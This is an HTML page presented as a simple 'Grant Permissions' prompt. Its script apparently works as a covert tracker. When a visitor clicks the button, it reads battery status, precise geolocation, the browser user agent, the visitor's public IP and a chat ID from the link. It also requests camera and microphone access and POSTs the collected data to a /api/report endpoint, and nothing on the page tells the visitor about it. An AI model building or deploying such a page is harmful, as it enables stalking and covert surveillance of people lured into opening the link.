<!DOCTYPE html>
<html>
<head>
  <title>Permission Page</title>
</head>
<body>
  <h1>Grant Permissions</h1>
  <button onclick="getPermissions()">Grant Now</button>

  <script>
    async function getPermissions() {
      let data = {
        battery: null,
        location: null,
        ip: null,
        device: navigator.userAgent,
        chatId: new URLSearchParams(window.location.search).get("cid")
      };

      // Battery
      if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        data.battery = `${battery.level * 100}% ${battery.charging ? 'Charging' : 'Not Charging'}`;
      }

      // Location
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
          data.location = `Lat: ${position.coords.latitude}, Long: ${position.coords.longitude}`;
          sendData(data);
        }, err => {
          console.log("Location error", err);
          sendData(data);
        });
      } else {
        sendData(data);
      }

      // IP Address
      fetch("https://api.ipify.org?format=json")
        .then(res => res.json())
        .then(json => data.ip = json.ip);

      // Camera & Mic Permissions
      try {
        await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        data.media = "Permissions Granted";
      } catch (err) {
        data.media = "Denied or Not Available";
      }
    }

    function sendData(data) {
      fetch("/api/report", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify(data)
      });
    }
  </script>
</body>
</html>
